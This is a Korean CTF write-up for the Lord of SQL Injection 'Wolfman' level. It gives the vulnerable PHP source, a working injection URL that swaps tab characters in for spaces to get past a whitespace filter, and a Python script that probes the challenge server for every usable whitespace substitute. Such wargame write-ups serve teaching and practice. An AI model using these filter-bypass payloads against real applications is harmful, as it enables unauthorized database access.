# Lord of SQL Injection No.5 Wolfman

Wolfman 문제는 공백(WhiteSpace)을 우회하고 `id`값을 충족하여 문제를 해결할 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

```php
if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
```
`preg_match` 함수에서 정규표현식 매칭을 실행하는 중에 공백(Whitespace)을 만나면 `No whitespace ~_~`를 출력하고 문제 풀이에 실패하게 된다.

#### 문제 풀이 조건

`preg_match`에 필터링되지 않고 입력한 `id`값이 `admin`과 일치하면 문제 해결에 성공한다.

## Solution
```
http://los.eagle-jump.org/wolfman_***.php?pw=%27%09or%09id=%27admin%27%09%23
```

위에서 언급했듯이 소스코드에서 `preg_match`가 공백(Whitespace)을 필터링하고 있기 때문에 `Whitespace`를 대신하여 사용할 수 있는 공백 문자를 URL에 삽입하면 문제풀이에 성공하게 된다.

#### `Whitespace` 대신에 사용할 수 있는 문자

```python
import urllib.request
from urllib.parse import quote

result = ""
for i in range(0, 127):
    url = "http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw='"
    add_url = "{0}or{0}id='admin'{0}#".format(chr(i))
    print("Searcing.. => {}".format(add_url))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent", "Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=4tgjrq03a101lqirm2povahog7")
    res = urllib.request.urlopen(re)

    if str(res.read()).find("WOLFMAN Clear!") != -1:
        result = result + "ASCII({})".format(hex(i)[2:]) + " "
        print("Found it!! => {} (ASCII - {})".format(chr(i),i))
print("Finished..")
print(result)
```

아스키코드에서 `Whitespace` 대신 사용할 수 있는 문자는 얼마나 있을까 호기심이 생겨 `Python`을 통해 코드를 짜보았다.

코드의 결과값으로 나온 대체 문자에는 5가지가 있었다.

* Tap (%09) // URL에서 사용된 대체 문자.
* Line Feed (%0A)
* Vertical Tab (%0B)
* Form Feed (%0C)
* Carriage Return (%0D)